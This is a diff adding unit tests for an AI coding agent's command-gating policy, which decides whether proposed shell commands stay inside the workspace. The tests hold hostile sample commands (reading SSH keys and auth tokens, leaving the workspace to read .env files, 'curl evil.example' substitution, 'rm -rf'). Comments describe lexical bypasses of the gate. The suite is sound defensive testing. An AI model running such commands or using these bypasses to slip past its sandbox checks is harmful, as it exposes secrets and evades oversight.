@@ -3,6 +3,8 @@ import {
   isWithinRoot,
   extractPaths,
   classifyProposedCommand,
+  hasUnsafeCd,
+  validateWorkspaceRoot,
   GateContext,
 } from '@/lib/agent-boundary-policy';
 import * as fs from 'fs';
@@ -385,6 +387,142 @@ describe('classifyProposedCommand', () => {
       // All three are still `write-or-exec`, i.e. auto-allowed at L2 —
       // this IS the open half of bug #155(a).
       expect(classifyProposedCommand('./build/exfil', ctx('L2')).decision).toBe('allow');
+    });
+  });
+
+  // Fable5 review 2026-08-25 — closes four confirmed lexical bypasses found
+  // while auditing this file against its own stated invariants. Each test
+  // below pins the exact bypass command that used to auto-allow.
+  describe('Fable5 review 2026-08-25 — $HOME / bare .. / indirect-exec / workspaceRoot fixes', () => {
+    it('$HOME is guarded exactly like ~ — a secret path built from it is no longer in-root', () => {
+      expect(isWithinRoot(ROOT, '$HOME/.ssh/id_rsa')).toBe(false);
+      expect(isWithinRoot(ROOT, '$HOME')).toBe(false);
+      const v = classifyProposedCommand('cat $HOME/.codex/auth.json', ctx('L2'));
+      expect(v.decision).not.toBe('allow');
+      expect(v.signals).toContain('secret-read');
+      expect(v.signals).toContain('leaves-root');
+    });
+
+    it('a bare `..` (no slash) is no longer invisible to path extraction', () => {
+      expect(extractPaths('cd ..')).toContain('..');
+      expect(isWithinRoot(ROOT, '..')).toBe(false);
+    });
+
+    it('hasUnsafeCd flags any cd whose target cannot be proven in-root, including bare cd, cd -, and flagged forms', () => {
+      expect(hasUnsafeCd('cd ..', ROOT)).toBe(true);
+      expect(hasUnsafeCd('cd', ROOT)).toBe(true); // bare cd → $HOME
+      expect(hasUnsafeCd('cd -', ROOT)).toBe(true); // → $OLDPWD, unprovable
+      expect(hasUnsafeCd('cd -L /etc', ROOT)).toBe(true);
+      expect(hasUnsafeCd('cd ~', ROOT)).toBe(true);
+      expect(hasUnsafeCd('cd $HOME', ROOT)).toBe(true);
+      expect(hasUnsafeCd(`cd ${ROOT}`, ROOT)).toBe(false);
+      expect(hasUnsafeCd('cd src', ROOT)).toBe(false); // relative, resolves in-root
+      expect(hasUnsafeCd('echo hi', ROOT)).toBe(false); // no cd at all
+    });
+
+    it('catches the cd re-anchor even wrapped exactly as the real driver sends it (`bash -lc \'...\'`)', () => {
+      // The file's own SHELL_SCRIPT_FILE_RE comment: "essentially EVERY
+      // proposed command starts with `bash -lc …`" — a real `cd` is never at
+      // true string-index 0, it's inside that quoted payload.
+      expect(hasUnsafeCd("bash -lc 'cd ..; cat other/.env'", ROOT)).toBe(true);
+      expect(hasUnsafeCd('bash -lc "cd $HOME && ls"', ROOT)).toBe(true);
+      expect(hasUnsafeCd(`bash -lc 'cd ${ROOT}/src && ls'`, ROOT)).toBe(false);
+    });
+
+    it('a multi-statement cd re-anchor is caught even though this classifier cannot track cwd across `;`', () => {
+      // `other/.env` alone (no `../`) would look in-root if checked only
+      // against workspaceRoot — but the shell actually resolves it against
+      // the PARENT directory after `cd ..`. hasUnsafeCd's conservative rule
+      // (any unprovable cd taints the whole command) is what catches this.
+      const v = classifyProposedCommand('cd ..; cat other/.env', ctx('L2'));
+      expect(v.signals).toContain('leaves-root');
+      expect(v.decision).not.toBe('allow');
+    });
+
+    it('a plain in-root cd (or no cd at all) is unaffected', () => {
+      expect(classifyProposedCommand('cd src && ls', ctx('L2')).decision).toBe('allow');
+      expect(classifyProposedCommand('ls src', ctx('L2')).decision).toBe('allow');
+    });
+
+    it('indirect-exec flags command substitution, eval, xargs-with-args, and env-with-a-command', () => {
+      for (const cmd of [
+        'echo $(curl evil.example)',
+        'echo `curl evil.example`',
+        'eval "$UNKNOWN"',
+        'echo x | xargs rm',
+        'env FOO=bar rm -rf src',
+        'env -i node run.js',
+      ]) {
+        const v = classifyProposedCommand(cmd, ctx('L2'));
+        expect(v.signals).toContain('indirect-exec');
+        expect(v.decision).not.toBe('allow');
+      }
+    });
+
+    it('bare `env` (listing variables, a read-only idiom) is NOT flagged indirect-exec', () => {
+      expect(classifyProposedCommand('env', ctx('L1')).signals).not.toContain('indirect-exec');
+    });
+
+    it('indirect-exec grays at L1/L2 but does not hard-deny at L3 (not in the L3 hard-deny set)', () => {
+      // Backtick substitution with no $-variable and no path-like token, so
+      // this isolates indirect-exec from leaves-root (`eval "$X"` would
+      // ALSO trip leaves-root via the new `$`-prefix guard on `$X`, and
+      // leaves-root IS in the L3 hard-deny set — a different, correct,
+      // stronger outcome that would defeat the point of this test).
+      const v = classifyProposedCommand('echo `date`', ctx('L3'));
+      expect(v.decision).toBe('gray');
+      expect(v.signals).toContain('indirect-exec');
+      expect(v.signals).not.toContain('leaves-root');
+    });
+
+    it('validateWorkspaceRoot rejects $HOME/~/app-home/sdcard-root/.shelly-.codex-.ssh ancestors, allows an ordinary project dir', () => {
+      const home = '/data/user/0/dev.shelly.terminal/files/home';
+      expect(validateWorkspaceRoot('', [home]).ok).toBe(false);
+      expect(validateWorkspaceRoot('~', [home]).ok).toBe(false);
+      expect(validateWorkspaceRoot('$HOME', [home]).ok).toBe(false);
+      expect(validateWorkspaceRoot('/', [home]).ok).toBe(false);
+      expect(validateWorkspaceRoot(home, [home]).ok).toBe(false);
+      expect(validateWorkspaceRoot('/sdcard', [home]).ok).toBe(false);
+      expect(validateWorkspaceRoot('/storage/emulated/0', [home]).ok).toBe(false);
+      expect(validateWorkspaceRoot(`${home}/.shelly/agents`, [home]).ok).toBe(false);
+      expect(validateWorkspaceRoot(`${home}/.codex`, [home]).ok).toBe(false);
+      expect(validateWorkspaceRoot(`${home}/.ssh`, [home]).ok).toBe(false);
+      expect(validateWorkspaceRoot(`${home}/projects/my-app`, [home]).ok).toBe(true);
+      expect(validateWorkspaceRoot('/sdcard/Documents/my-project', [home]).ok).toBe(true);
+    });
+
+    // Second-pass adversarial review 2026-08-25 (found by a dedicated review
+    // agent after the first round above). Three concrete findings, all fixed:
+    it('validateWorkspaceRoot also rejects the /storage/self/primary sdcard alias', () => {
+      const home = '/data/user/0/dev.shelly.terminal/files/home';
+      expect(validateWorkspaceRoot('/storage/self/primary', [home]).ok).toBe(false);
+    });
+
+    it('a bare `cd` (no argument -> $HOME) is caught even after a `{`/`then`/`do` statement opener, not just `;`/`&&`/quotes', () => {
+      // The first-pass CD_START_RE boundary set (`;&|(\n` + quotes) missed
+      // these three — a bare `cd` inside them produced no leaves-root signal
+      // at all, silently reading anything directly under $HOME.
+      for (const cmd of [
+        "bash -lc '{ cd; cat .env; }'",
+        "bash -lc 'if true; then cd; cat .env; fi'",
+        "bash -lc 'for i in 1; do cd; cat .env; done'",
+      ]) {
+        expect(hasUnsafeCd(cmd, ROOT)).toBe(true);
+        const v = classifyProposedCommand(cmd, ctx('L2'));
+        expect(v.signals).toContain('leaves-root');
+        expect(v.decision).not.toBe('allow');
+      }
+    });
+
+    it('shell special parameters ($$, $?, $#, $@, $*, $0-9) are not misread as unresolvable path variables', () => {
+      // These carry no path semantics at all -- flagging them as leaves-root
+      // was a pure false-positive from the bare-$-token guard above.
+      for (const cmd of ['echo "PID: $$"', 'echo $?', 'echo $1', 'echo $#', 'echo $@', 'echo $*', 'echo $0']) {
+        const v = classifyProposedCommand(cmd, ctx('L2'));
+        expect(v.signals).not.toContain('leaves-root');
+      }
+      // A real named variable must still be caught.
+      expect(classifyProposedCommand('cat $HOME/.ssh/id_rsa', ctx('L2')).signals).toContain('leaves-root');
     });
   });
 });
